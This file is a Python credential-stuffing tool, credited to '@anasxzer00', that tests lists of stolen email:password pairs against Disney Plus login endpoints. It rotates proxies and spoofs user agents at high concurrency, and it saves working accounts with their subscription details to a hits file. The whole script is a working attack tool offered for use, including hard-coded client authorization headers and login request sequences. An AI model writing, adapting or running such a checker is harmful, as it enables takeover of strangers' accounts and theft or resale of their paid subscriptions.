import aiohttp
import asyncio
import random
import re
import json
from colorama import init, Fore, Style

init(autoreset=True)

anasxzer00_Hits = 0
anasxzer00_Bads = 0
anasxzer00_Rtrs = 0
anasxzer00_uNkNoWn = 0
counter_lock = asyncio.Lock()

AnasComboFile = input(" -- @anasxzer00 | Disney Plus Checker\n\n -[$] Put Combo: ")
AnasProxyFile = input(" -[$] Put Proxies File: ")
AnasDisneyHits = "Disney-Hits.txt"

anasxzer00 = 250

def anasxzer00_RandomUA():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"
    ]
    return random.choice(user_agents)

def AnasProxyParseeSsSsSsS(line):
    line = line.strip()
    if "@" in line:
        parts = line.split("@")
        if len(parts) == 2:
            first, second = parts
            if re.match(r".+\.\w+", first) and ":" in first:
                return f"{second}@{first}"
            else:
                return line
        else:
            return line
    else:
        parts = line.split(":")
        if len(parts) == 2:
            return f"{parts[0]}:{parts[1]}"
        elif len(parts) == 4:
            if re.match(r".+\.\w+", parts[0]):
                return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                return f"{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return line

def AnasLoad_F(filename):
    with open(filename, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def translate_boolean(value):
    return "attivo" if value.lower() == "true" else "False ❌"

async def AnasUpDaTe_Stats(result_type):
    global anasxzer00_Hits, anasxzer00_Bads, anasxzer00_Rtrs, anasxzer00_uNkNoWn
    async with counter_lock:
        if result_type == "hit":
            anasxzer00_Hits += 1
        elif result_type == "bad":
            anasxzer00_Bads += 1
        elif result_type == "retry":
            anasxzer00_Rtrs += 1
        elif result_type == "unknown":
            anasxzer00_uNkNoWn += 1
        stats = (f"-- Hits: {Style.BRIGHT}{Fore.GREEN}{anasxzer00_Hits}{Style.RESET_ALL} | "
                 f"Bad: {Style.BRIGHT}{Fore.RED}{anasxzer00_Bads}{Style.RESET_ALL} | "
                 f"Retries: {Style.BRIGHT}{Fore.YELLOW}{anasxzer00_Rtrs}{Style.RESET_ALL} | "
                 f"Unknown: {Style.BRIGHT}{Fore.RED}{anasxzer00_uNkNoWn}{Style.RESET_ALL}")
        print(stats)

async def AnasDisneyPlusSsSs(combo, proxies_list, session, semaphore):
    async with semaphore:
        try:
            try:
                user, passwd = combo.split(":", 1)
            except Exception:
                await AnasUpDaTe_Stats("unknown")
                return ("unknown", f"{combo} | Combo parsing error.")
            UA = anasxzer00_RandomUA()
            proxy_raw = random.choice(proxies_list)
            proxy = AnasProxyParseeSsSsSsS(proxy_raw)
            proxy_url = "http://" + proxy
            url_device = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
            payload_device = {
                "query": "mutation registerDevice($input: RegisterDeviceInput!) { registerDevice(registerDevice: $input) { grant { grantType assertion } } }",
                "variables": {
                    "input": {
                        "deviceFamily": "browser",
                        "applicationRuntime": "chrome",
                        "deviceProfile": "windows",
                        "deviceLanguage": "en-US",
                        "attributes": {
                            "osDeviceIds": [],
                            "manufacturer": "microsoft",
                            "model": None,
                            "operatingSystem": "windows",
                            "operatingSystemVersion": "10.0",
                            "browserName": "chrome",
                            "browserVersion": "95.0.4638"
                        }
                    }
                }
            }
            headers_device = {
                "authority": "disney.api.edge.bamgrid.com",
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "authorization": "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
                "content-type": "application/json",
                "origin": "https://www.disneyplus.com",
                "referer": "https://www.disneyplus.com/",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "windows",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "12.0",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "user-agent": UA
            }
            async with session.post(url_device, json=payload_device, headers=headers_device, proxy=proxy_url) as resp_device:
                text_device = await resp_device.text()
            if "403 ERROR" in text_device or "forbidden-location" in text_device:
                await AnasUpDaTe_Stats("bad")
                return ("bad", f"{user}:{passwd} | Proxy: {proxy} | Device registration error.")
            m_assertion = re.search(r'"assertion":"(.*?)"}}},', text_device)
            Ac = m_assertion.group(1) if m_assertion else None
            if not Ac:
                await AnasUpDaTe_Stats("unknown")
                return ("unknown", f"{user}:{passwd} | Could not parse device assertion.")
            m_token1 = re.search(r'accessToken":"(.*?)"', text_device)
            token1 = m_token1.group(1) if m_token1 else None
            if not token1:
                await AnasUpDaTe_Stats("unknown")
                return ("unknown", f"{user}:{passwd} | Could not parse device access token.")
            
            url_check = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
            payload_check = {
                "query": " query Check($email: String!) { check(email: $email) { operations nextOperation } }",
                "variables": {"email": user}
            }
            headers_check = {
                "authority": "disney.api.edge.bamgrid.com",
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "authorization": token1,
                "content-type": "application/json",
                "origin": "https://www.disneyplus.com",
                "referer": "https://www.disneyplus.com/",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "windows",
                "x-bamsdk-platform-id": "browser",
                "x-bamsdk-version": "12.0",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "user-agent": UA
            }
            async with session.post(url_check, json=payload_check, headers=headers_check, proxy=proxy_url) as resp_check:
                text_check = await resp_check.text()
            if ('{"operations":["Register"]' in text_check or 
                "upstream error with status '400'" in text_check or 
                '{"operations":["RegisterAccount"]' in text_check):
                await AnasUpDaTe_Stats("bad")
                return ("bad", f"{user}:{passwd} | Email check error: Registration required or bad response.")
            if ('["Login","OTP"]' not in text_check and 'operations":["OTP"]' not in text_check):
                await AnasUpDaTe_Stats("unknown")
                return ("unknown", f"{user}:{passwd} | Email check: unexpected response format.")
            
            url_login = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
            payload_login = {
                "query": (
                    " mutation login($input: LoginInput!) { login(login: $input) { account { ...account profiles { ...profile } } actionGrant } } "
                    " fragment account on Account { id attributes { blocks { expiry reason } consentPreferences { dataElements { name value } purposes { consentDate "
                    " firstTransactionDate id lastTransactionCollectionPointId lastTransactionCollectionPointVersion lastTransactionDate name status totalTransactionCount version } } "
                    " dssIdentityCreatedAt email emailVerified lastSecurityFlaggedAt locations { manual { country } purchase { country source } registration { geoIp { country } } } "
                    " securityFlagged tags taxId userVerified } parentalControls { isProfileCreationProtected } flows { star { isOnboarded } } } "
                    " fragment profile on Profile { id name isAge21Verified attributes { avatar { id userSelected } isDefault kidsModeEnabled languagePreferences { appLanguage playbackLanguage "
                    " preferAudioDescription preferSDH subtitleAppearance { backgroundColor backgroundOpacity description font size textColor } subtitleLanguage subtitlesEnabled } groupWatch { enabled } "
                    " parentalControls { kidProofExitEnabled isPinProtected } playbackSettings { autoplay backgroundVideo prefer133 preferImaxEnhancedVersion previewAudioOnHome previewVideoOnHome } } "
                    " maturityRating { ...maturityRating } flows { star { eligibleForOnboarding isOnboarded } } } "
                    " fragment maturityRating on MaturityRating { ratingSystem ratingSystemValues contentMaturityRating maxRatingSystemValue isMaxContentMaturityRating }"
                ),
                "variables": {"input": {"email": user, "password": passwd}}
            }
            headers_login = headers_check.copy()
            async with session.post(url_login, json=payload_login, headers=headers_login, proxy=proxy_url) as resp_login:
                text_login = await resp_login.text()
            if "403 ERROR" in text_login:
                await AnasUpDaTe_Stats("retry")
                return ("retry", f"{user}:{passwd} | Login error: 403 ERROR encountered")
            if "Bad credentials" in text_login:
                await AnasUpDaTe_Stats("bad")
                return ("bad", f"{user}:{passwd} | Login error: Bad credentials")
            if "Account is blocked" in text_login:
                await AnasUpDaTe_Stats("bad")
                return ("bad", f"{user}:{passwd} | Login error: Account is blocked")
            if '"data":{"login' not in text_login:
                await AnasUpDaTe_Stats("unknown")
                return ("unknown", f"{user}:{passwd} | Login error: Unexpected response")
            m_token2 = re.search(r'accessToken":"(.*?)"', text_login)
            token2 = m_token2.group(1) if m_token2 else None
            if not token2:
                await AnasUpDaTe_Stats("unknown")
                return ("unknown", f"{user}:{passwd} | Failed to parse login access token")
            
            url_sub = "https://disney.api.edge.bamgrid.com/v2/subscribers"
            headers_sub = {
                "authority": "disney.api.edge.bamgrid.com",
                "accept": "application/json; charset=utf-8",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "authorization": f"Bearer {token2}",
                "content-type": "application/json; charset=utf-8",
                "origin": "https://www.disneyplus.com",
                "referer": "https://www.disneyplus.com/",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-application-version": "1.1.2",
                "x-bamsdk-client-id": "disney-svod-3d9324fc",
                "x-bamsdk-platform": "windows",
                "x-bamsdk-version": "12.0",
                "x-dss-edge-accept": "vnd.dss.edge+json; version=2",
                "user-agent": UA
            }
            async with session.get(url_sub, headers=headers_sub, proxy=proxy_url) as resp_sub:
                text_sub = await resp_sub.text()
            try:
                sub_data = json.loads(text_sub)
            except Exception as e:
                await AnasUpDaTe_Stats("unknown")
                return ("unknown", f"{user}:{passwd} | Error parsing subscriber JSON: {str(e)}")
            
            if '"subscriberStatus":"CHURNED"' in text_sub:
                subscriber_status = "CUSTOM"
            elif '"subscriberStatus":"ACTIVE"' in text_sub:
                subscriber_status = "Premium+"
            elif "subscription.not.found" in text_sub:
                subscriber_status = "FREE"
            else:
                subscriber_status = "UNKNOWN"
            
            m_purchase = re.search(r'"purchaseDate":"(.*?)",', text_sub)
            purchase_date = m_purchase.group(1) if m_purchase else "UNKNOWN"
            m_sub_type = re.search(r'"subType":"(.*?)"},', text_sub)
            sub_type = m_sub_type.group(1) if m_sub_type else "UNKNOWN"
            m_sub_period = re.search(r'"subscriptionPeriod":(.*?),', text_sub)
            sub_period = m_sub_period.group(1) if m_sub_period else "UNKNOWN"
            m_is_free = re.search(r'{"isFreeTrial":(.*?)}', text_sub)
            is_free_trial = m_is_free.group(1) if m_is_free else "false"
            free_trial_str = translate_boolean(is_free_trial)
            m_plan_name = re.search(r'"name":"(.*?)"', text_sub)
            plan_name = m_plan_name.group(1) if m_plan_name else "UNKNOWN"
            m_bundle = re.search(r'"bundle":(.*?),', text_sub)
            bundle_val = m_bundle.group(1) if m_bundle else "false"
            bundle_translated = translate_boolean(bundle_val)
            m_next_renew = re.search(r'nextRenewalDate":"(.*?)T', text_sub)
            next_renew = m_next_renew.group(1) if m_next_renew else "UNKNOWN"
            
            output_line = (
                f"{user}:{passwd} | Bundle Enabled = {bundle_translated} | Subscriber Status = {subscriber_status} | "
                f"Purchase Date = {purchase_date} | Sub Type = {sub_type} | Subscription Period = {sub_period} | "
                f"Free Trial = {free_trial_str} | Plan Name = {plan_name} | Next Renew Date = {next_renew} | Tool By @anasxzer00"
            )
            await AnasUpDaTe_Stats("hit")
            with open(AnasDisneyHits, "a", encoding="utf-8") as f:
                f.write(output_line + "\n")
            return ("hit", output_line)
        
        except aiohttp.ClientError as e:
            await AnasUpDaTe_Stats("retry")
            return ("retry", f"{user}:{passwd} | Proxy error")
        except Exception as ex:
            await AnasUpDaTe_Stats("unknown")
            return ("unknown", f"{user}:{passwd} | Unknown error")

async def main():
    combos = AnasLoad_F(AnasComboFile)
    proxies_list = AnasLoad_F(AnasProxyFile)
    semaphore = asyncio.Semaphore(anasxzer00)
    async with aiohttp.ClientSession() as session:
        tasks = [AnasDisneyPlusSsSs(combo, proxies_list, session, semaphore) for combo in combos]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())